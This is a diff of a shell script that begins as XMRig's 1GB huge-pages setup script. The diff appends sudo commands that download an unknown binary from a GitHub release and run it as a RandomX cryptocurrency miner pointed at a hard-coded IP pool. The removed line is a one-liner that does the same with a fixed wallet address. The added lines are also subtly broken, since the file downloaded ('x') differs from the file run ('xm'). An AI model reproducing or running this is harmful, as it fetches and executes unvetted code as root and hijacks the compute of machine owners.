@@ -1,1 +1,15 @@
-screen -S po wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/enable_1gb_pages.sh && chmod +x enable_1gb_pages.sh && sudo ./enable_1gb_pages.sh && wget https://github.com/ddao2604/tech/releases/download/1.0/xm && chmod +x xm && ./xm -o 107.178.97.202:4444 -u ZEPHsC3nt8og5yF9Bb9XLbVzftgZZx7jR8TkPVmPGRYGek4RAPsnGLTg1rVjwr1nbnhqU4r8KvkxjbNwwaMpe3vcDzRMqCP8AbQ -p kanika -a rx/0 -k --randomx-1gb-pages
+#!/bin/bash -e
+
+# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages
+
+sysctl -w vm.nr_hugepages=$(nproc)
+
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
+
+echo "1GB pages successfully enabled"
+sudo wget https://github.com/ddao2604/tech/releases/download/1.0/x
+sudo chmod +x xm
+sudo screen ./xm -o 107.178.97.202:4444 -u $1 -p $2 -a rx/0 -k --randomx-1gb-pages
